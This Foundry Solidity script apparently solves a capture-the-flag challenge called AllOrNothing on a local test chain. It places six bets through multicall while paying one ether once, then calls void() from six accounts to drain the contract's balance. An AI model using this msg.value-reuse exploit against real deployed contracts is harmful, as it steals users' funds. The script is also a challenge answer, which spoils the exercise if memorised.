// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {AllOrNothing} from "../../src/05_AllOrNothing/AllOrNothing.sol";

contract AllOrNothingSolver is Script {

  AllOrNothing allOrNothing;
  uint256 user0 = vm.envUint("PRIVATE_KEY");
  uint256 user1 = vm.envUint("PRIVATE_KEY1");
  uint256 user2 = vm.envUint("PRIVATE_KEY2");
  uint256 user3 = vm.envUint("PRIVATE_KEY3");
  uint256 user4 = vm.envUint("PRIVATE_KEY4");
  uint256 user5 = vm.envUint("PRIVATE_KEY5");

  address user0Address = vm.envAddress("USER");
  // anvil addresses 0 to 4
  address user1Address = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
  address user2Address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
  address user3Address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;
  address user4Address = 0x90F79bf6EB2c4f870365E785982E1f101E93b906;
  address user5Address = 0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65;

  function run() external {
    allOrNothing = AllOrNothing(vm.envAddress("CONTRACT"));
    vm.startBroadcast(user0);
    console.log("AllOrNothingSolver: Running...");
    bytes[] memory calls = new bytes[](6);
    bytes memory call0 = abi.encodeWithSignature("bet(uint256,address)", 10, user0Address);
    bytes memory call1 = abi.encodeWithSignature("bet(uint256,address)", 11, user1Address);
    bytes memory call2 = abi.encodeWithSignature("bet(uint256,address)", 12, user2Address);
    bytes memory call3 = abi.encodeWithSignature("bet(uint256,address)", 13, user3Address);
    bytes memory call4 = abi.encodeWithSignature("bet(uint256,address)", 14, user4Address);
    bytes memory call5 = abi.encodeWithSignature("bet(uint256,address)", 15, user5Address);
    calls[0] = call0;
    calls[1] = call1;
    calls[2] = call2;
    calls[3] = call3;
    calls[4] = call4;
    calls[5] = call5;
    allOrNothing.multicall{value: 1 ether}(calls);
    console.log("AllOrNothingSolver: Bet placed");
    allOrNothing.void();
    vm.stopBroadcast();

    vm.startBroadcast(user1);
    allOrNothing.void();
    vm.stopBroadcast();
    vm.startBroadcast(user2);
    allOrNothing.void();
    vm.stopBroadcast();
    vm.startBroadcast(user3);
    allOrNothing.void();
    vm.stopBroadcast();
    vm.startBroadcast(user4);
    allOrNothing.void();
    vm.stopBroadcast();
    vm.startBroadcast(user5);
    allOrNothing.void();
    vm.stopBroadcast();
    console.log("AllOrNothingSolver: Done... Contract's balance is: %s", address(allOrNothing).balance);
  }

}